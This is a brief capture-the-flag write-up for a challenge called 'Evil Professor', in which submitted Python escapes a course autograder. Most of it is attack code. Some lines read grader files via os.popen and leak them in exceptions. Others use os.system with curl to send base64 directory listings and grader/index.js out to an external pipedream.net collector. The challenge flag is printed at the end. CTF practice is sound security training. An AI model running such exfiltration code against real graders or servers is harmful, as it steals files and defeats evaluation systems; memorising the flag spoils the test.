# Evil Professor

My CSCE 437 professor just released our latest programming assignment, but it seems like he wants us to fail...

## Solution

An exception can be raised to get output from the script.

```python
# List directories command execution
    import os
    raise(Exception(os.popen('ls grader').read()))

    # Read index with flag
    raise(Exception(open('grader/index.js').read()))
```

Alternatively, outbound http requests can be made.

```python
import os

# use ls to exfil directory and file listings
os.system("curl https://en5q5wqvzmucp.x.pipedream.net/$(ls grader | base64)")

# extract index.js autograder
os.system("curl https://en5q5wqvzmucp.x.pipedream.net/ -F=@grader/index.js")
```

flag:
`gigem{d0n7_d0_7hi5_0n_y0ur_4c7u41_455i9nm3n75}`
